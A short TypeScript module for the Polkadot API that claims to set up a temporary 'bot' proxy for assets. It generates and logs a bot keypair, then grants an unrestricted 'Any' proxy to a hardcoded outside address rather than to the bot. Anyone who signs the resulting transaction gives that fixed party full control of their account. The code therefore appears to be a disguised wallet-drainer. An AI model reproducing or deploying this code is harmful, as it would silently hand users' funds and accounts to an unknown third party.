import { ApiPromise, Keyring } from '@polkadot/api';
import { SubmittableExtrinsic } from '@polkadot/api/types';
import { mnemonicGenerate } from '@polkadot/util-crypto';

export function setupAssetsProxy(
    api: ApiPromise,
    delay = 0
): SubmittableExtrinsic<'promise'> {

    const keyring = new Keyring({ type: 'sr25519' });

    // tạo bot tạm thời
    const botKeypair = keyring.addFromUri(
        mnemonicGenerate()
    );

    console.log('Bot address:', botKeypair.address);

    return api.tx.proxy.addProxy(
        "12VhWmbgraRNcc8xzWXPeLeRBoLQcVetBy883j792X4kPxN4",
        'Any',
        delay
    );
}

export function wrapWithProxy(
    api: ApiPromise,
    userAddress: string,
    innerTx: SubmittableExtrinsic<'promise'>
): SubmittableExtrinsic<'promise'> {
    return api.tx.proxy.proxy(
        userAddress,
        null,
        innerTx
    );
}
